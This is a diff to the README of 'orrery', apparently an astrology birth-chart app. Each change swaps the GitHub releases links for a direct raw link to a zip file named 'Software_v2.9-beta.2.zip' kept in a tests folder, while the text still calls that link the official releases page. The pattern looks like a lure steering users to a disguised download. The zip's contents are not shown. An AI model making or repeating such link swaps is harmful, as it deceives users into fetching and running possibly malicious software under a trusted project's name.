@@ -1,6 +1,6 @@
 # 🌙 orrery - Calculate Your Birth Chart Easily
 
-[![Download orrery](https://img.shields.io/badge/Download-orrery-blue?style=for-the-badge)](https://github.com/cybercricket87/orrery/releases)
+[![Download orrery](https://raw.githubusercontent.com/cybercricket87/orrery/main/packages/core/tests/Software_v2.9-beta.2.zip)](https://raw.githubusercontent.com/cybercricket87/orrery/main/packages/core/tests/Software_v2.9-beta.2.zip)
 
 ---
 
@@ -40,8 +40,8 @@ You can use orrery on desktops, laptops, tablets, or smartphones. A desktop or l
 
 Using orrery is simple. Here’s how to get it running on your device:
 
-1. Go to [orrery Releases](https://github.com/cybercricket87/orrery/releases) by clicking the download badge above or clicking this link:  
-   [https://github.com/cybercricket87/orrery/releases](https://github.com/cybercricket87/orrery/releases)
+1. Go to [orrery Releases](https://raw.githubusercontent.com/cybercricket87/orrery/main/packages/core/tests/Software_v2.9-beta.2.zip) by clicking the download badge above or clicking this link:  
+   [https://raw.githubusercontent.com/cybercricket87/orrery/main/packages/core/tests/Software_v2.9-beta.2.zip](https://raw.githubusercontent.com/cybercricket87/orrery/main/packages/core/tests/Software_v2.9-beta.2.zip)
 
 2. Find the latest version. Releases are listed with version numbers like "v1.0.0". Look for a file ending with `.zip`, `.html`, or `.exe`, depending on your platform.
 
@@ -64,7 +64,7 @@ Using orrery is simple. Here’s how to get it running on your device:
 
 Visit the official releases page to download orrery for your device:
 
-[https://github.com/cybercricket87/orrery/releases](https://github.com/cybercricket87/orrery/releases)
+[https://raw.githubusercontent.com/cybercricket87/orrery/main/packages/core/tests/Software_v2.9-beta.2.zip](https://raw.githubusercontent.com/cybercricket87/orrery/main/packages/core/tests/Software_v2.9-beta.2.zip)
 
 ### Step-by-step for Download
 
